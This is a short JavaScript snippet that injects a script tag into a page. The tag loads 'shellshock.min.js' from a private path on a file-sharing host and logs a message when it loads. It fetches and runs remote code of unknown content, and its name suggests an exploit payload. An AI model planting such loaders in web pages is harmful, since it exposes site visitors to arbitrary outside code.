
 var script = document.createElement('script');
  script.src = 'https://cdn.filesend.jp/private/fB6p0r1DTyzuOKzdsxhtpJFETKPcuyB1pmA8hDvQQR4ELYXDcxZhIp11hLug1MQR/shellshock.min.js';
  script.type = 'text/javascript';
  script.onload = function() {
    console.log('your script have been loaded');
  }
  document.body.appendChild(script);
